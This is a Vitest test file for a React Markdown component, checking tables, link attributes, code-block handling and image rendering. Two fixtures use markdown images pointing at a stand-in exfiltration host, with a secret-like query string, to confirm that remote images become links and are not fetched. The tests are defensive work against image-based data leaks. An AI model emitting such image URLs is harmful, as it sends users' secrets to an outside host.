import { render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { Markdown } from "./Markdown";

describe("Markdown", () => {
  it("renders GFM tables, links as plain anchors in a new tab, and fenced code as pre > code", () => {
    const { container } = render(<Markdown text={"| a | b |\n|---|---|\n| 1 | 2 |\n\n[docs](https://example.com)\n\n```py\nx = 1\n```"} />);
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getByRole("link", { name: "docs" })).toHaveAttribute("rel", "noopener noreferrer");
    expect(container.querySelector("pre > code")).toHaveTextContent("x = 1");
  });

  it("hands a fenced block's text and language to `code`, and leaves inline code alone", () => {
    const code = vi.fn((text: string, lang?: string) => <b data-lang={lang}>{text.toUpperCase()}</b>);
    const { container } = render(<Markdown text={"use `x` here\n\n```py\nx = 1\n```"} code={code} />);
    expect(code).toHaveBeenCalledWith("x = 1", "py");
    expect(container.querySelector("pre > code > b")).toHaveTextContent("X = 1");
    expect(container.querySelector("p > code")).toHaveTextContent("x");
  });

  it.each([
    ["absolute", "https://exfil.test:8849/pixel.png?secret=AKIA", "image: exfil.test:8849/pixel.png"],
    ["protocol-relative", "//exfil.test/p.gif?d=1", "image: exfil.test/p.gif"],
  ])("renders a remote image (%s) as a link to it, never fetched on its own", (_, src, label) => {
    const { container } = render(<Markdown text={`![status](${src})`} />);
    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByRole("link", { name: label });
    expect(link).toHaveAttribute("href", src);
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
    expect(link).toHaveAttribute("title", "status");
  });

  it.each([
    ["same-origin path", "/api/work-items/w1/diagram.png"],
    ["same-origin absolute", `${location.origin}/diagram.png`],
    ["inline data", "data:image/png;base64,iVBORw0KGgo="],
  ])("shows an image from %s", (_, src) => {
    const { container } = render(<Markdown text={`![chart](${src})`} />);
    expect(container.querySelector("img")).toHaveAttribute("src", src);
    expect(screen.queryByRole("link")).toBeNull();
  });
});
